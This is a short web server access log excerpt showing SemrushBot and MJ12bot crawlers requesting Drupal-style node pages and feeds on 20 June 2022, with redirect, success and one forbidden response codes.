185.191.171.39 - - [20/Jun/2022:01:51:23 +0000] "GET /node/939/ HTTP/1.1" 200 11162 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
161.97.135.248 - - [20/Jun/2022:01:51:30 +0000] "GET /node/19 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:35 +0000] "GET /node/19 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:41 +0000] "GET /node/19/ HTTP/1.1" 200 10248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:45 +0000] "GET /node/19/feed HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:53 +0000] "GET /node/19/feed HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:58 +0000] "GET /node/19/feed/ HTTP/1.1" 403 134 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:52:04 +0000] "GET /node/190 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:52:12 +0000] "GET /node/190 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
